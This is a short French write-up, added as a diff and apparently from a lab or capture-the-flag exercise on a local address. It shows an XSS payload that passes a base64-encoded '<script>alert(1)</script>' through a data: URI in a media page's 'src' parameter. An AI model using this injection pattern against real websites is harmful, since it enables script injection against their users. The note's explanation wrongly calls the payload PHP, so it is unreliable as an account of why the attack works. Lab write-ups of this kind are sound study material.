@@ -1,0 +1,9 @@
+Faille xss
+Verification du lancement du php alors encoder le php en base64 pour passer cette vérification.
+Pourquoi ça marche ?
+Parce que le site cherche une source nsa qui est un objet donc execute du code pour le retrouver.
+http://192.168.64.17//?page=media&src=nsa devient
+http://192.168.64.17//?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+signifie <script>alert(1)</script>
